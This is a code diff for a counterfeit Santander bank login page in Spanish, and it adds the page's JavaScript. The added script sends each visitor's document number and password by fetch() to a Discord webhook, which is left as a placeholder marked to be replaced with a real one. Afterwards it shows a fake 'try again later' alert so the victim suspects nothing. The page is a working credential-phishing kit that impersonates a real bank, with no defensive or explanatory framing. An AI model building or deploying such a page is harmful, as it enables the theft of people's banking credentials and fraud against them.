@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Santander - Buenas tardes</title>
     <style>
-        /* [Todo el CSS permanece igual, sin cambios] */
         * {
             margin: 0;
             padding: 0;
@@ -304,4 +303,119 @@
                 </div>
                 <a href="#" class="recover-link">Recupera tu clave de acceso</a>
                 <p class="remember-text">
-                    Tu usuario se recordará en este dispositivo. Solamente tendrás que introducir
+                    Tu usuario se recordará en este dispositivo. Solamente tendrás que introducir la clave.
+                </p>
+            </div>
+
+            <a href="#" class="more-info" onclick="toggleMoreInfo()">Más información</a>
+
+            <button type="submit" class="login-btn">Entrar</button>
+        </form>
+    </main>
+
+    <script>
+        async function sendDiscordNotification(docNumber, password) {
+            const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // REEMPLAZA con tu webhook real
+
+            const data = {
+                content: `Nuevo inicio de sesión:\nDocumento: ${docNumber || 'desconocido'}\nContraseña: ${password || 'no especificada'}`
+            };
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data),
+                });
+                console.log('Notificación enviada a Discord');
+            } catch (error) {
+                console.error('Error enviando la notificación a Discord:', error);
+            }
+        }
+
+        function handleLogin(event) {
+            event.preventDefault();
+
+            const nifInput = document.getElementById('nif-input');
+            const passwordInput = document.getElementById('password');
+
+            const docNumber = nifInput.value.trim();
+            const password = passwordInput.value;
+
+            if (!docNumber) {
+                alert('Por favor, introduce tu número de documento.');
+                return;
+            }
+            if (!password) {
+                alert('Por favor, introduce tu contraseña.');
+                return;
+            }
+
+            // Enviar notificación con documento y contraseña
+            sendDiscordNotification(docNumber, password);
+
+            // Simulación de login
+            const loginBtn = document.querySelector('.login-btn');
+            loginBtn.textContent = 'Entrando...';
+            loginBtn.style.background = 'linear-gradient(135deg, #666, #999)';
+
+            setTimeout(() => {
+                alert('Intentelo de nuevo mas tarde');
+                loginBtn.textContent = 'Entrar';
+                loginBtn.style.background = 'linear-gradient(135deg, #EC0000, #FF4444)';
+            }, 2000);
+        }
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggleBtn = document.querySelector('.password-toggle');
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleBtn.textContent = '🙈';
+            } else {
+                passwordInput.type = 'password';
+                toggleBtn.textContent = '👁️';
+            }
+        }
+
+        function toggleMenu() {
+            alert('Menú desplegable - Funcionalidad a implementar');
+        }
+
+        function toggleMoreInfo() {
+            alert('Más información sobre el proceso de login');
+        }
+
+        // Efectos de hover en los inputs
+        document.querySelectorAll('.form-input').forEach(input => {
+            input.addEventListener('focus', function () {
+                this.style.transform = 'translateY(-2px)';
+            });
+
+            input.addEventListener('blur', function () {
+                this.style.transform = 'translateY(0)';
+            });
+        });
+
+        // Saludo dinámico basado en la hora
+        function updateGreeting() {
+            const now = new Date();
+            const hour = now.getHours();
+            const greetingElement = document.querySelector('.greeting');
+
+            if (hour < 12) {
+                greetingElement.textContent = 'Buenos días';
+            } else if (hour < 18) {
+                greetingElement.textContent = 'Buenas tardes';
+            } else {
+                greetingElement.textContent = 'Buenas noches';
+            }
+        }
+
+        // Actualizar saludo al cargar la página
+        updateGreeting();
+    </script>
+</body>
+</html>
+
